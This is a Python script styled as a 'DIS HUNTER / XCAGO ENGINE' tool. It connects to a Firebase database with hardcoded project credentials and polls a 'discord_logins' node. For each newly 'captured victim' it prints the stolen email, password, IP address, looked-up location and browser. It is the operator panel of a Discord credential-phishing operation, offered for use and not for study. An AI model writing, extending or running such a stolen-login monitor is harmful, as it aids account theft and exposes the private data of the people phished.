import pyrebase
import time
import os
from datetime import datetime
from colorama import init, Fore, Style, Back
import requests

# Initialize colorama
init()

def get_location(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        data = response.json()
        if data['status'] == 'success':
            return f"{data['country']}, {data['city']}"
        return "Unknown"
    except:
        return "Unknown"

def initialize_firebase():
    config = {
        "apiKey": "AIzaSyCUXd1zE7AHDGiFO1khBFBXILU1Ba2tlMU",
        "authDomain": "xcago-login.firebaseapp.com",
        "databaseURL": "https://xcago-login-default-rtdb.europe-west1.firebasedatabase.app",
        "projectId": "xcago-login",
        "storageBucket": "xcago-login.firebasestorage.app",
        "messagingSenderId": "887538896230",
        "appId": "1:887538896230:web:47945c0377344a402e8ca7"
    }
    
    try:
        firebase = pyrebase.initialize_app(config)
        db = firebase.database()
        print(f"{Fore.GREEN}[+] Successfully connected to Firebase!{Style.RESET_ALL}")
        return db
    except Exception as e:
        print(f"{Fore.RED}[-] Firebase connection error: {e}{Style.RESET_ALL}")
        return None

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.RED}
    ▓█████▄  ██▓  ██████     ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
    ▒██▀ ██▌▓██▒▒██    ▒    ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
    ░██   █▌▒██▒░ ▓██▄      ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
    ░▓█▄   ▌░██░  ▒   ██▒   ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▓ ░██░▒██████▒▒   ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒{Style.RESET_ALL}

{Fore.CYAN}╔═════════════════════════ XCAGO ENGINE ═════════════════════════╗
║  {Fore.RED}[Discord]{Fore.CYAN}  : {Fore.WHITE}https://discord.gg/hfNM8c3EaZ{Fore.CYAN}                   ║
║  {Fore.RED}[Version]{Fore.CYAN}  : 2.1 - Professional Edition                         ║
║  {Fore.RED}[Status]{Fore.CYAN}   : {Fore.GREEN}Active{Fore.CYAN}                                          ║
╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def monitor_logins(db):
    last_data = {}
    print_banner()
    
    while True:
        try:
            current_time = datetime.now().strftime('%H:%M:%S')
            print(f"\r{Fore.BLUE}[{current_time}] Searching for new victims... {Style.RESET_ALL}", end='')
            
            # Update data from Firebase
            current_data = db.child("discord_logins").get()
            if current_data:
                current_data = current_data.val()
                
                if current_data and isinstance(current_data, dict):
                    new_items = {k: v for k, v in current_data.items() 
                               if k not in last_data}
                    
                    if new_items:
                        print_banner()
                        
                        for key, value in new_items.items():
                            print(f"\n{Fore.RED}[!] New victim captured!{Style.RESET_ALL}")
                            print(f"{Fore.RED}══════════════════════════════════════════════════{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}[+] Email    : {Fore.WHITE}{value.get('email', 'N/A')}")
                            print(f"{Fore.YELLOW}[+] Password : {Fore.WHITE}{value.get('password', 'N/A')}")
                            print(f"{Fore.YELLOW}[+] IP       : {Fore.WHITE}{value.get('ip', 'Unknown')}")
                            print(f"{Fore.YELLOW}[+] Location : {Fore.WHITE}{get_location(value.get('ip', 'Unknown'))}")
                            print(f"{Fore.YELLOW}[+] Time     : {Fore.WHITE}{value.get('timestamp', 'N/A')}")
                            print(f"{Fore.YELLOW}[+] Browser  : {Fore.WHITE}{value.get('userAgent', 'N/A')[:50]}...")
                            print(f"{Fore.RED}══════════════════════════════════════════════════{Style.RESET_ALL}\n")
                    
                    last_data = current_data
            
            time.sleep(1)
            
        except Exception as e:
            print(f"\n{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        db = initialize_firebase()
        if db:
            monitor_logins(db)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program terminated{Style.RESET_ALL}")